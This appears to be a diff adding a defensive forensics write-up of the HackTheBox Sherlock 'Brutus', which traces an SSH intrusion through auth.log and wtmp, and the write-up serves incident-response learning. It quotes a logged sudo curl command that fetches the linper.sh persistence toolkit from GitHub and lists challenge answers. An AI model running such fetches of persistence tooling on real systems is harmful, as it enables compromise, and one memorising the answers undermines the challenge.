@@ -1,0 +1,58 @@
+HTB Sherlock: Brutus - Forensic Writeup
+📝 Scenario
+Brutus is a defensive forensics challenge on HackTheBox. The goal is to analyze Linux artifacts (auth.log and wtmp) to trace an attacker's steps, identify their origin, and document the techniques used to compromise the system and maintain persistence.
+
+Python 3: To run the utmp.py parser.
+
+Standard Linux Utilities: grep, cat, ll.
+
+🚩 Phase 1: Initial Access & Extraction
+The journey began with an encrypted archive Brutus.zip. Standard unzip failed to handle the Method 99 (AES) encryption, so we pivoted to 7-Zip.
+
+Archive Password: hacktheblue
+
+auth.log: Authentication attempts and system events.
+
+wtmp: Binary login/logout history.
+
+utmp.py: A Python helper script to parse binary artifacts.
+
+🔍 Phase 2: Identifying the Attacker
+By parsing the wtmp artifact using the provided script, we identified the attacker's IP and their initial successful entry.
+
+1. Attacker IP Identification
+The wtmp logs revealed a specific IP address connecting to multiple sessions on March 6th:
+
+Attacker IP: 65.2.161.68
+
+2. Manual Login Discovery
+The attacker first gained access to the root account via a manual terminal session (pts/1) before creating a persistence mechanism.
+
+First Root Login Timestamp: 2024-03-06 06:32:45
+
+Plaintext
+"USER" "2549" "pts/1" "ts/1" "root" "65.2.161.68" ... "2024/03/06 06:32:45"
+🛡️ Phase 3: Persistence & MITRE ATT&CK Mapping
+The logs show that once the attacker gained root access, they didn't just leave. They created a new user account to maintain access.
+
+1. Account Creation
+In the auth.log, we see the transition from the root session to a new user:
+
+Plaintext
+Mar 6 06:37:34 ip-172-31-35-28 systemd-logind[411]: New session 49 of user cyberjunkie.
+Persistence User: cyberjunkie
+
+MITRE ATT&CK Mapping: * Technique: Create Account
+
+Sub-technique: Local Account (T1136.001)
+
+🚀 Phase 4: Post-Exploitation & Script Execution
+The attacker attempted to automate further privilege escalation and system auditing by pulling a script from a remote repository.
+
+Log Entry:
+
+Plaintext
+Mar 6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+Target Script: linper.sh (a Linux Persistence toolkit).
+
+Command: Used curl to fetch a script directly from GitHub to execute in the root context via sudo.
